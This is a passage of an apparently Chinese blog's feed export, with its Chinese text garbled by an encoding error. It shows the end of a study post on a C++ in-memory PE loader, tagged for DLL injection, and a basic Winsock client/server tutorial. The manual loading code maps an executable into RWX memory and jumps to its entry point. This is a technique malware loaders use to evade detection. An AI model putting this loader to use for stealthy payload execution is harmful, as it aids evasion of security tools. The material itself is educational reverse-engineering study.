sectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pedata.ntHeader);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pedata.fileHeader-&gt;NumberOfSections; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (sectionHeader[i].VirtualAddress == <span class="number">0</span> &amp;&amp; sectionHeader[i].SizeOfRawData == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID srcMem = (LPVOID)(fileBase + sectionHeader[i].PointerToRawData);</span><br><span class="line">LPVOID dstMem = (BYTE*)memBase + sectionHeader[i].VirtualAddress;</span><br><span class="line"><span class="type">size_t</span> sizeOfRawData = sectionHeader[i].SizeOfRawData;</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(dstMem, srcMem, sizeOfRawData);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - èŠ‚åŒº%d: %s, æ˜ å°„åˆ°å†…å­˜ 0x%llX\n&quot;</span>, i, sectionHeader[i].Name, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(dstMem));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------æ˜ å°„èŠ‚åŒºç»“æŸ--------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareReloc</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------å¼€å§‹ä¿®å¤é‡å®šä½è¡¨-------\n&quot;</span>);</span><br><span class="line">PIMAGE_BASE_RELOCATION relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)memBase + pedata.optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"><span class="type">size_t</span> delta = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase) - pedata.optionalHeader-&gt;ImageBase;</span><br><span class="line"><span class="keyword">if</span> (relTable == <span class="literal">nullptr</span> || delta == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (relTable-&gt;SizeOfBlock != <span class="number">0</span> &amp;&amp; relTable-&gt;VirtualAddress != <span class="number">0</span>) &#123;</span><br><span class="line">WORD* pRdata = (WORD*)((BYTE*)relTable + <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="type">size_t</span> dataNum = (relTable-&gt;SizeOfBlock - <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="built_in">sizeof</span>(WORD);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - è¡¨%d:\n&quot;</span>, j);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dataNum; i++) &#123;</span><br><span class="line">DWORD type = pRdata[i] &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="keyword">if</span> (type == IMAGE_REL_BASED_DIR64) &#123;</span><br><span class="line">DWORD64* targetAddress = (DWORD64*)((BYTE*)memBase + relTable-&gt;VirtualAddress + (pRdata[i] &amp; <span class="number">0xFFF</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - å¯¹åº”åœ°å€: 0x%llX æ•°æ®: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(targetAddress), *targetAddress);</span><br><span class="line">*targetAddress += delta;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   -&gt; 0x%llX  delta: 0x%llX\n&quot;</span>, *targetAddress, delta);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)relTable + relTable-&gt;SizeOfBlock);</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------ä¿®å¤é‡å®šä½è¡¨ç»“æŸ-------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareIAT</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------å¼€å§‹ä¿®å¤IAT--------\n&quot;</span>);</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)memBase + pedata.optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line"><span class="keyword">while</span> (importDesc-&gt;OriginalFirstThunk) &#123;</span><br><span class="line"><span class="type">char</span>* Dllname = (<span class="type">char</span>*)((BYTE*)memBase + importDesc-&gt;Name);</span><br><span class="line">HMODULE hDll = <span class="built_in">GetModuleHandleA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - åŠ è½½DLL:%s\n&quot;</span>, Dllname);</span><br><span class="line">hDll = <span class="built_in">LoadLibraryA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - åŠ è½½DLLå¤±è´¥,å¯¼å…¥å‡½æ•°ç»ˆæ­¢\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - DLLå·²å­˜åœ¨:%s\n&quot;</span>, Dllname);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_THUNK_DATA INT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;OriginalFirstThunk);</span><br><span class="line">PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; INT[i].u1.AddressOfData; i++) &#123;</span><br><span class="line">DWORD64 pFunc = <span class="literal">NULL</span>;</span><br><span class="line">DWORD64 targetFunc = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;((BYTE*)memBase + INT[i].u1.AddressOfData);</span><br><span class="line"><span class="keyword">if</span> (targetFunc &amp; IMAGE_ORDINAL_FLAG) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - ä»¥åºå·:%d å¯¼å…¥å‡½æ•°\n&quot;</span>, <span class="built_in">IMAGE_ORDINAL</span>(targetFunc));</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, <span class="built_in">MAKEINTRESOURCEA</span>(<span class="built_in">IMAGE_ORDINAL</span>(targetFunc)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - ä»¥åç§°:%s å¯¼å…¥å‡½æ•°\n&quot;</span>, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pFunc) &#123;</span><br><span class="line">IAT[i].u1.Function = pFunc;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - å‡½æ•°å¯¼å…¥æˆåŠŸ\n   - ç›®çš„åœ°å€: 0x%llX\n&quot;</span>, pFunc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - å‡½æ•°å¯¼å…¥å¤±è´¥\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">importDesc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------ä¿®å¤IATç»“æŸ--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">setImageBase</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line">IMAGE_DOS_HEADER* dosHeader = (PIMAGE_DOS_HEADER)memBase;</span><br><span class="line">IMAGE_NT_HEADERS* ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)memBase + dosHeader-&gt;e_lfanew);</span><br><span class="line">ntHeader-&gt;OptionalHeader.ImageBase = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------ä¿®æ­£é•œåƒåŸºåœ°å€æˆåŠŸ--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* targetPath = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"></span><br><span class="line">std::unique_ptr&lt;BYTE[]&gt; fileBase = <span class="built_in">mapToMemory</span>(targetPath);</span><br><span class="line"><span class="keyword">if</span> (!fileBase) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">loadPEstruct</span>(fileBase.<span class="built_in">get</span>());</span><br><span class="line"></span><br><span class="line">LPVOID memBase = <span class="built_in">VirtualAllocEx</span>(<span class="built_in">GetCurrentProcess</span>(), <span class="literal">nullptr</span>, pedata.memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!memBase) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">makeHeadandSectionMap</span>(memBase, fileBase.<span class="built_in">get</span>());</span><br><span class="line"><span class="built_in">repareReloc</span>(memBase);</span><br><span class="line"><span class="built_in">repareIAT</span>(memBase);</span><br><span class="line"><span class="built_in">setImageBase</span>(memBase);</span><br><span class="line"></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(<span class="built_in">GetCurrentProcess</span>(), memBase, pedata.memSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;å¼€å§‹æ‰§è¡Œ\n&quot;</span>);</span><br><span class="line"><span class="keyword">auto</span> targetFunc = <span class="built_in">reinterpret_cast</span>&lt;<span class="built_in">int</span>(*)(<span class="type">void</span>)&gt;((BYTE*)memBase + ((PIMAGE_NT_HEADERS)((BYTE*)memBase + ((PIMAGE_DOS_HEADER)memBase)-&gt;e_lfanew))-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line"><span class="built_in">targetFunc</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(<span class="built_in">GetCurrentProcess</span>(), memBase, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç›®å‰æœªè§£å†³çš„é—®é¢˜">ç›®å‰æœªè§£å†³çš„é—®é¢˜</h2><ul><li>å¯¹DLLçš„è½½å…¥ï¼Œä¸‹æ¬¡å­¦åå°„DLLæ³¨å…¥çš„æ—¶å€™è¯•è¯•</li><li>è‹¥æ–‡ä»¶æœ¬èº«æœ‰UPXç­‰å£³ï¼Œä¿®æ­£çš„æ‰€æœ‰å†…å®¹å‡ä¸ºå£³çš„å†…å®¹ï¼Œå£³è§£å‹åå¹¶ä¸èƒ½è¿˜åŸPEæœ¬èº«çš„æ˜ å°„åˆ°åç§»åœ°å€ï¼Œå¯¼è‡´æŠ¥é”™</li></ul>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å®è·µ </category>
          
          <category> é€†å‘ </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> DLLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç»œç¼–ç¨‹1-CSæ¨¡å‹</title>
      <link href="/posts/7e127f51.html"/>
      <url>/posts/7e127f51.html</url>
      
        <content type="html"><![CDATA[<h2 id="CSæ¨¡å‹">CSæ¨¡å‹</h2><p>Client/Serveræ¨¡å‹ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ¨¡å‹ï¼ŒæœåŠ¡ç«¯ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä¸€ç›´å¼€æ”¾ï¼Œç­‰å¾…å®¢æˆ·ç«¯ç¨‹åºæ¥å…¥ã€‚å®¢æˆ·ç«¯ç¨‹åºåœ¨ç”¨æˆ·ç”µè„‘ä¸Šæ‰§è¡Œï¼Œæ‰“å¼€åä¸»åŠ¨ç»™æœåŠ¡ç«¯å‘é€è¯·æ±‚ï¼Œç„¶åå»ºç«‹è¿æ¥ï¼Œç›¸äº’é€šä¿¡ï¼Œç›´åˆ°æœåŠ¡ç«¯æˆ–å®¢æˆ·ç«¯å–æ¶ˆè¿æ¥ã€‚</p><h3 id="å¥—æ¥å­—">å¥—æ¥å­—</h3><p>socketï¼šè‹±æ–‡åŸæ„æ˜¯æ’åº§ã€‚å®ƒæ˜¯TCPåè®®çš„ç«¯å£ï¼Œç”±äºTCPæä¾›çš„æ˜¯ç‚¹å¯¹ç‚¹é€šä¿¡ï¼Œå› æ­¤æ¯æ¡TCPè¿æ¥éƒ½ç”±ä¸€ç»„å¥—æ¥å­—ç¡®å®šã€‚socketä»‹äºåº”ç”¨å±‚å’Œä¼ è¾“å±‚ä¹‹é—´ï¼Œé€šè¿‡IPå®ç°ä¸»æœºé—´çš„äº¤æµï¼Œé€šè¿‡portå®ç°åº”ç”¨ä¹‹é—´çš„äº¤æµã€‚</p><h4 id="å®šä¹‰">å®šä¹‰</h4><p>$$<br>socket = (IP:port)<br>$$</p><p>$$<br>TCPè¿æ¥ ::={socket_1,socket_2}<br>$$</p><p>å…¶ä¸­çš„ä¸¤ä¸ªsocketåˆ†åˆ«ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„ipä¸ç«¯å£å·ã€‚</p><h4 id="åˆ†ç±»">åˆ†ç±»</h4><ul><li>æµå¼å¥—æ¥å­—ï¼šç”¨äºTCP</li><li>æ•°æ®åŒ…å¥—æ¥å­—ï¼šç”¨äºUDP</li><li>åŸå§‹å¥—æ¥å­—ï¼šç”¨äºè‡ªå®šä¹‰åº•å±‚åè®®</li></ul><h4 id="CPPå®ç°æ–¹æ³•">CPPå®ç°æ–¹æ³•</h4><p>Windowsä¸­ï¼Œä½¿ç”¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>æ¥ä½¿ç”¨å¥—æ¥å­—</p><h3 id="CSå…·ä½“å†…å®¹">CSå…·ä½“å†…å®¹</h3><p>æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯åˆ†åˆ«å»ºç«‹å¥—æ¥å­—ï¼Œè®¾å®šå¯¹åº”ipå’Œport</p><p>æœåŠ¡ç«¯ç­‰å¾…è¿æ¥ï¼Œå®¢æˆ·ç«¯è¯·æ±‚è¿æ¥</p><p>è¿æ¥æˆåŠŸåï¼Œç›¸äº’å‘é€æ¶ˆæ¯åˆ°ç¼“å†²åŒº</p><p>ç»“æŸåå…³é—­ã€‚</p><p><img src="https://s2.loli.net/2024/12/13/BKviqpCyVWOrLNt.png" alt="ç½‘ä¸Šæ‰¾çš„"></p><h3 id="CPPå®ç°">CPPå®ç°</h3><p>socketå‡½æ•°ï¼Œåˆ›å»ºsocketå¹¶è®¾å®šæ¨¡å¼ï¼Œè¿™é‡Œä½¿ç”¨TCP</p><p>bindå‡½æ•°ï¼Œç»‘å®šsocketåˆ°ip:portä¸Š</p><p>listenå‡½æ•°ï¼ŒæœåŠ¡å™¨ç›‘å¬å¯¹åº”ç«¯å£æœ‰æ— ä¿¡æ¯</p><p>acceptå‡½æ•°æ— é™ç­‰å¾…è¿æ¥ï¼Œè·å–å®¢æˆ·ç«¯å¥—æ¥å­—ï¼Œè¿”å›åè¡¨ç¤ºè¿æ¥æˆåŠŸï¼Œconnectå‡½æ•°è¯·æ±‚è¿æ¥</p><p>recvå‡½æ•°æ¥æ”¶æ•°æ®ï¼Œsendå‡½æ•°å‘é€æ•°æ®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//client</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">WSADATA data;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data))<span class="comment">//ç”¨äºåˆå§‹åŒ–åº“å‡½æ•°</span></span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;WSAdataåˆå§‹åŒ–å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET cSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (cSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;å¥—æ¥å­—åˆ›å»ºå¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in saddr;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line"><span class="built_in">InetPton</span>(AF_INET, <span class="string">L&quot;127.0.0.1&quot;</span>, &amp;saddr.sin_addr);<span class="comment">//å°†æœ¬åœ°æ•°æ®è½¬æ¢ä¸ºç½‘ç»œç«¯åºï¼ˆå¤§ç«¯åºï¼‰</span></span><br><span class="line"></span><br><span class="line">saddr.sin_port = <span class="built_in">htons</span>(<span class="number">4567</span>);<span class="comment">//åŒä¸Šï¼Œç«¯å£å¯è‡ªè¡ŒæŒ‡å®š</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(cSocket, (SOCKADDR*)&amp;saddr, <span class="built_in">sizeof</span>(saddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;è¿æ¥åˆ°æœåŠ¡å™¨å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* sendData = <span class="string">&quot;Hello,world&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(cSocket, sendData, <span class="built_in">strlen</span>(sendData), <span class="number">0</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;å‘é€æ•°æ®å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">WSADATA data;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data))</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;WSAdataåˆå§‹åŒ–å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET sSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (sSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;å¥—æ¥å­—åˆ›å»ºå¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in saddr;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = <span class="built_in">htons</span>(<span class="number">4567</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">bind</span>(sSocket, (SOCKADDR*)&amp;saddr, <span class="built_in">sizeof</span>(saddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;ç»‘å®šå¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">listen</span>(sSocket, SOMAXCONN) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;ç›‘å¬å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET cSocket;</span><br><span class="line">sockaddr_in caddr;</span><br><span class="line"><span class="type">int</span> addrSize = <span class="built_in">sizeof</span>(caddr);</span><br><span class="line">cSocket = <span class="built_in">accept</span>(sSocket, (SOCKADDR*)&amp;caddr, &amp;addrSize);</span><br><span class="line"><span class="keyword">if</span> (cSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;æ¥å—è¿æ¥å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> recvbuf[<span class="number">512</span>];</span><br><span class="line"><span class="type">int</span> bytesReceived;</span><br><span class="line"><span class="keyword">while</span> ((bytesReceived = <span class="built_in">recv</span>(cSocket, recvbuf, <span class="built_in">sizeof</span>(recvbuf) - <span class="number">1</span>, <span class="number">0</span>)) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">recvbuf[bytesReceived] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">std::cout &lt;&lt; recvbuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (bytesReceived == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;æ¥æ”¶æ•°æ®å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å¼€å‘ </category>
          
          <category> è¯­è¨€å­¦ä¹  </category>
          
          <category> ç½‘ç»œç¼–ç¨‹ </category>
          
          <category> CPP </category>
          
          <category> ç½‘ç»œç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
